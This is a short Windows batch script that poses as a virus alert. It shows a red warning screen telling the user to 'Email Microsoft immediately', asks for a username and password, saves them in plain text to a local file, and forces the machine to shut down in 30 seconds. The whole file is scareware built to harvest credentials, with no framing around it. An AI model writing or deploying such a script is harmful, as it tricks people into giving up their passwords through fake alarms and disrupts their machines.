@echo off
color c
start Iexplore
Title WARNING
echo WARNING VIRUS HAS ENTERED THROUGH THE DATA FRAME
echo Email Microsoft immediately
cd "C:\CMDREMARKS"
set /p user=Username:
set /p pass=Password:
echo Username="%user%" Password="%pass%" >CMDREMARKS.txt
shutdown -s -t 30 -c "Request Denied